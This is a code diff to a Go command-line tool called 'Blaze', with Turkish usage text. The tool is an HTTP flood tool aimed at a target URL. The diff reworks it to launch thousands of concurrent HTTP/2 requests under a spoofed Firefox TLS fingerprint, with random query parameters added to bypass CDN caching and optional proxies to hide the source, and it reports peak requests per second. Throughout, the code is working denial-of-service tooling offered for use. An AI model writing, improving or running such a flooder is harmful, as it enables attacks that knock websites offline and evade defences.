@@ -9,6 +9,7 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"sync"
 	"sync/atomic"
 	"syscall"
 	"time"
@@ -16,48 +17,11 @@ import (
 	gofire "github.com/JSInvasor/Gohttp-clientfingerprintemulateandfastest"
 )
 
-const version = "1.0.0"
-
-const banner = `
-  ██████╗ ██╗      █████╗ ███████╗███████╗
-  ██╔══██╗██║     ██╔══██╗╚══███╔╝██╔════╝
-  ██████╔╝██║     ███████║  ███╔╝ █████╗
-  ██╔══██╗██║     ██╔══██║ ███╔╝  ██╔══╝
-  ██████╔╝███████╗██║  ██║███████╗███████╗
-  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝
-`
-
-const (
-	cReset  = "\033[0m"
-	cRed    = "\033[31m"
-	cGreen  = "\033[32m"
-	cYellow = "\033[33m"
-	cCyan   = "\033[36m"
-	cWhite  = "\033[37m"
-	cGray   = "\033[90m"
-	cBold   = "\033[1m"
-)
-
-func usage() {
-	fmt.Printf("%s%s%s", cCyan, banner, cReset)
-	fmt.Printf("  %sBlaze v%s%s | Firefox 148 TLS | Pipeline Max RPS\n\n", cBold, version, cReset)
-	fmt.Printf("  %sKullanim:%s\n", cYellow, cReset)
-	fmt.Printf("    blaze <url> <sure_sn> <workers> [method] [proxy]\n\n")
-	fmt.Printf("  %sOrnekler:%s\n", cGreen, cReset)
-	fmt.Printf("    ./blaze https://hedef.com 60 5000\n")
-	fmt.Printf("    ./blaze https://hedef.com 120 8000 GET\n")
-	fmt.Printf("    ./blaze https://hedef.com 60 5000 GET socks5://127.0.0.1:1080\n\n")
-	fmt.Printf("  %sParametreler:%s\n", cGreen, cReset)
-	fmt.Printf("    %-25s Hedef URL\n", "  <url>")
-	fmt.Printf("    %-25s Kac saniye calisacak\n", "  <sure_sn>")
-	fmt.Printf("    %-25s Pipeline worker sayisi (3000-10000 onerilen)\n", "  <workers>")
-	fmt.Printf("    %-25s HTTP method (default: GET)\n", "  [method]")
-	fmt.Printf("    %-25s Proxy (http:// veya socks5://)\n\n", "  [proxy]")
-}
-
 func main() {
 	if len(os.Args) < 4 {
-		usage()
+		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy]")
+		fmt.Println("ornek:    ./blaze https://hedef.com 60 64 32")
+		fmt.Println("ornek:    ./blaze https://hedef.com 60 128 50 GET socks5://127.0.0.1:1080")
 		os.Exit(1)
 	}
 
@@ -66,44 +30,41 @@ func main() {
 		targetURL = "https://" + targetURL
 	}
 
-	duration, err := strconv.Atoi(os.Args[2])
-	if err != nil || duration <= 0 {
-		die("gecersiz sure: %s", os.Args[2])
-	}
+	durSec := mustInt(os.Args[2], "sure")
+	threads := mustInt(os.Args[3], "thread")
 
-	workers, err := strconv.Atoi(os.Args[3])
-	if err != nil || workers <= 0 {
-		die("gecersiz worker sayisi: %s", os.Args[3])
+	streams := 32
+	if len(os.Args) >= 5 {
+		streams = mustInt(os.Args[4], "stream")
 	}
 
 	method := "GET"
-	if len(os.Args) >= 5 {
-		method = strings.ToUpper(os.Args[4])
+	if len(os.Args) >= 6 {
+		method = strings.ToUpper(os.Args[5])
 	}
 
 	proxyURL := ""
-	if len(os.Args) >= 6 {
-		proxyURL = os.Args[5]
+	if len(os.Args) >= 7 {
+		proxyURL = os.Args[6]
 	}
 
-	run(targetURL, duration, workers, method, proxyURL)
+	run(targetURL, durSec, threads, streams, method, proxyURL)
 }
 
-func run(targetURL string, duration, workers int, method, proxyURL string) {
-	// Max out GOMAXPROCS
+func run(targetURL string, durSec, threads, streams int, method, proxyURL string) {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 
-	fmt.Printf("%s%s%s", cCyan, banner, cReset)
-	fmt.Printf("  %sBlaze v%s%s | Firefox 148 TLS | Pipeline Mode\n\n", cBold, version, cReset)
+	totalConcurrent := threads * streams
 
-	// Connection pool sizes based on workers
-	idlePerHost := workers * 2
-	if idlePerHost < 512 {
-		idlePerHost = 512
+	idlePerHost := totalConcurrent
+	if idlePerHost < 256 {
+		idlePerHost = 256
 	}
-	totalIdle := idlePerHost * 3
+	totalIdle := totalConcurrent * 2
+	if totalIdle < 512 {
+		totalIdle = 512
+	}
 
-	// Build client options
 	opts := []gofire.Option{
 		gofire.WithTimeout(10 * time.Second),
 		gofire.WithTLSHandshakeTimeout(8 * time.Second),
@@ -124,79 +85,101 @@ func run(targetURL string, duration, workers int, method, proxyURL string) {
 
 	client, err := gofire.Emulate(gofire.Firefox148, opts...)
 	if err != nil {
-		die("client olusturulamadi: %v", err)
+		fmt.Fprintf(os.Stderr, "hata: client olusturulamadi: %v\n", err)
+		os.Exit(1)
 	}
 	defer client.Close()
 
-	// Print config
-	fmt.Printf("  %s[Hedef]%s       %s\n", cYellow, cReset, targetURL)
-	fmt.Printf("  %s[Sure]%s        %ds\n", cYellow, cReset, duration)
-	fmt.Printf("  %s[Workers]%s     %d\n", cYellow, cReset, workers)
-	fmt.Printf("  %s[Method]%s      %s\n", cYellow, cReset, method)
-	fmt.Printf("  %s[Pool]%s        %d idle/host | %d total\n", cYellow, cReset, idlePerHost, totalIdle)
-	fmt.Printf("  %s[CPU]%s         %d cores\n", cYellow, cReset, runtime.NumCPU())
+	fmt.Printf("hedef:     %s\n", targetURL)
+	fmt.Printf("sure:      %ds\n", durSec)
+	fmt.Printf("thread:    %d\n", threads)
+	fmt.Printf("stream:    %d (per thread)\n", streams)
+	fmt.Printf("eszamanli: %d\n", totalConcurrent)
+	fmt.Printf("method:    %s\n", method)
 	if proxyURL != "" {
-		fmt.Printf("  %s[Proxy]%s       %s\n", cYellow, cReset, proxyURL)
+		fmt.Printf("proxy:     %s\n", proxyURL)
 	}
 
-	// Pre-warm connections
-	fmt.Printf("\n  %s[~]%s Baglanti isitiliyor...\n", cCyan, cReset)
-	warmCtx, warmCancel := context.WithTimeout(context.Background(), 15*time.Second)
-	warmCount := workers / 10
-	if warmCount < 16 {
-		warmCount = 16
-	}
-	if warmCount > 256 {
-		warmCount = 256
+	// Pre-warm
+	fmt.Print("baglanti isitiliyor...")
+	warmCtx, warmCancel := context.WithTimeout(context.Background(), 10*time.Second)
+	warmCount := threads
+	if warmCount > 64 {
+		warmCount = 64
 	}
 	_ = client.PreConnect(warmCtx, targetURL, warmCount)
 	warmCancel()
-	fmt.Printf("  %s[+]%s %d baglanti hazir\n", cGreen, cReset, client.ActiveConnections())
+	fmt.Printf(" %d baglanti hazir\n", client.ActiveConnections())
 
-	// Context with duration + signal handling
-	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
+	// Context
+	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durSec)*time.Second)
 	defer cancel()
 
 	sigCh := make(chan os.Signal, 1)
 	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
 		<-sigCh
-		fmt.Printf("\n  %s[!]%s Durduruluyor...\n", cRed, cReset)
+		fmt.Println("\ndurduruluyor...")
 		cancel()
 	}()
 
-	// Create pipeline
-	pipeline := client.NewPipeline(workers)
-	defer pipeline.Close()
+	var (
+		totalSent    atomic.Int64
+		totalSuccess atomic.Int64
+		totalFailed  atomic.Int64
+		statusCodes  sync.Map
+	)
 
-	// Stats tracking
-	var localSent atomic.Int64
 	startTime := time.Now()
+	fmt.Printf("basliyor... %d eszamanli istek\n\n", totalConcurrent)
 
-	fmt.Printf("  %s[*]%s Basliyor... %d worker pipeline\n\n", cCyan, cReset, workers)
-
-	// Feed goroutines - saturate the pipeline from multiple feeders
-	feeders := runtime.NumCPU()
-	if feeders < 4 {
-		feeders = 4
-	}
-	if feeders > 32 {
-		feeders = 32
-	}
-
-	done := make(chan struct{})
-
-	for i := 0; i < feeders; i++ {
+	// Worker goroutines - thread x stream model (HTTP/2 multiplexing)
+	var wg sync.WaitGroup
+	for i := 0; i < threads; i++ {
+		wg.Add(1)
 		go func() {
+			defer wg.Done()
+
+			sem := make(chan struct{}, streams)
+			var innerWg sync.WaitGroup
+
 			for {
 				select {
 				case <-ctx.Done():
+					innerWg.Wait()
 					return
 				default:
-					url := cacheBust(targetURL)
-					pipeline.FireAndForget(ctx, method, url, nil, nil)
-					localSent.Add(1)
 				}
+
+				select {
+				case sem <- struct{}{}:
+				case <-ctx.Done():
+					innerWg.Wait()
+					return
+				}
+
+				reqURL := cacheBust(targetURL)
+				totalSent.Add(1)
+
+				innerWg.Add(1)
+				go func(u string) {
+					defer func() {
+						<-sem
+						innerWg.Done()
+					}()
+
+					resp, err := client.DoWithContext(ctx, method, u, nil, nil)
+					if err != nil {
+						totalFailed.Add(1)
+						return
+					}
+
+					totalSuccess.Add(1)
+					sc := resp.StatusCode()
+					val, _ := statusCodes.LoadOrStore(sc, &atomic.Int64{})
+					val.(*atomic.Int64).Add(1)
+					resp.Close()
+				}(reqURL)
 			}
 		}()
 	}
@@ -205,8 +188,7 @@ func run(targetURL string, duration, workers int, method, proxyURL string) {
 	go func() {
 		ticker := time.NewTicker(1 * time.Second)
 		defer ticker.Stop()
-
-		var lastOK, lastErr int64
+		var lastSent int64
 		var peakRPS int64
 
 		for {
@@ -214,81 +196,60 @@ func run(targetURL string, duration, workers int, method, proxyURL string) {
 			case <-ctx.Done():
 				return
 			case <-ticker.C:
-				ok := pipeline.Stats.TotalOK.Load()
-				fail := pipeline.Stats.TotalErr.Load()
-				sent := pipeline.Stats.TotalSent.Load()
+				sent := totalSent.Load()
+				ok := totalSuccess.Load()
+				fail := totalFailed.Load()
 				elapsed := time.Since(startTime).Seconds()
-				remaining := float64(duration) - elapsed
-				if remaining < 0 {
-					remaining = 0
-				}
 
-				currentOK := ok - lastOK
-				currentErr := fail - lastErr
-				currentRPS := currentOK + currentErr
-				lastOK = ok
-				lastErr = fail
-
-				if currentRPS > peakRPS {
-					peakRPS = currentRPS
+				rps := sent - lastSent
+				lastSent = sent
+				if rps > peakRPS {
+					peakRPS = rps
 				}
 
 				avgRPS := int64(0)
 				if elapsed > 0 {
-					avgRPS = int64(float64(ok+fail) / elapsed)
+					avgRPS = int64(float64(sent) / elapsed)
 				}
 
-				fmt.Printf("\r  %s[*]%s Sent:%s%d%s | OK:%s%d%s | Err:%s%d%s | RPS:%s%d%s | Avg:%s%d%s | Peak:%s%d%s | %s%.0fs%s/%s%.0fs%s   ",
-					cCyan, cReset,
-					cWhite, sent, cReset,
-					cGreen, ok, cReset,
-					cRed, fail, cReset,
-					cYellow, currentRPS, cReset,
-					cCyan, avgRPS, cReset,
-					cGreen, peakRPS, cReset,
-					cGray, elapsed, cReset,
-					cGray, remaining, cReset,
-				)
+				fmt.Printf("\rsent:%d ok:%d fail:%d rps:%d avg:%d peak:%d %.0fs/%ds   ",
+					sent, ok, fail, rps, avgRPS, peakRPS, elapsed, int(elapsed)+1)
 			}
 		}
 	}()
 
-	// Wait for context to expire
-	<-ctx.Done()
-	close(done)
+	wg.Wait()
 
-	// Let in-flight requests finish
-	time.Sleep(2 * time.Second)
-
-	// Final report
-	endTime := time.Now()
-	totalDuration := endTime.Sub(startTime)
-	sent := pipeline.Stats.TotalSent.Load()
-	ok := pipeline.Stats.TotalOK.Load()
-	fail := pipeline.Stats.TotalErr.Load()
+	// Final
+	totalDuration := time.Since(startTime)
+	sent := totalSent.Load()
+	ok := totalSuccess.Load()
+	fail := totalFailed.Load()
 
 	avgRPS := float64(0)
 	if totalDuration.Seconds() > 0 {
-		avgRPS = float64(ok+fail) / totalDuration.Seconds()
+		avgRPS = float64(sent) / totalDuration.Seconds()
 	}
 	successRate := float64(0)
 	if sent > 0 {
 		successRate = float64(ok) / float64(sent) * 100
 	}
 
-	fmt.Printf("\n\n  %s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", cGray, cReset)
-	fmt.Printf("  %s%s[SONUCLAR]%s\n\n", cBold, cGreen, cReset)
-	fmt.Printf("    Toplam Gonderilen : %s%d%s\n", cWhite, sent, cReset)
-	fmt.Printf("    Basarili          : %s%d%s (%%%.1f)\n", cGreen, ok, cReset, successRate)
-	fmt.Printf("    Basarisiz         : %s%d%s\n", cRed, fail, cReset)
-	fmt.Printf("    Sure              : %s%v%s\n", cYellow, totalDuration.Round(time.Millisecond), cReset)
-	fmt.Printf("    Ortalama RPS      : %s%.0f%s req/s\n", cCyan, avgRPS, cReset)
-	fmt.Printf("    Workers           : %s%d%s\n", cGray, workers, cReset)
-	fmt.Printf("    Aktif Baglanti    : %s%d%s\n", cGray, client.ActiveConnections(), cReset)
-	fmt.Printf("  %s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n\n", cGray, cReset)
+	fmt.Printf("\n\n--- sonuclar ---\n")
+	fmt.Printf("gonderilen: %d\n", sent)
+	fmt.Printf("basarili:   %d (%%%.1f)\n", ok, successRate)
+	fmt.Printf("basarisiz:  %d\n", fail)
+	fmt.Printf("sure:       %v\n", totalDuration.Round(time.Millisecond))
+	fmt.Printf("ort. rps:   %.0f req/s\n", avgRPS)
+	fmt.Printf("baglanti:   %d\n", client.ActiveConnections())
+
+	statusCodes.Range(func(key, value interface{}) bool {
+		fmt.Printf("  %d: %d\n", key.(int), value.(*atomic.Int64).Load())
+		return true
+	})
+	fmt.Println()
 }
 
-// cacheBust adds a random query param to bypass CDN/server cache.
 var bustParams = []string{"_", "cb", "nc", "t", "v", "r", "ts", "z"}
 
 func cacheBust(base string) string {
@@ -309,7 +270,11 @@ func randStr(n int) string {
 	return string(b)
 }
 
-func die(format string, args ...interface{}) {
-	fmt.Fprintf(os.Stderr, "  %s[HATA]%s %s\n", cRed, cReset, fmt.Sprintf(format, args...))
-	os.Exit(1)
+func mustInt(s, name string) int {
+	v, err := strconv.Atoi(s)
+	if err != nil || v <= 0 {
+		fmt.Fprintf(os.Stderr, "hata: gecersiz %s: %s\n", name, s)
+		os.Exit(1)
+	}
+	return v
 }
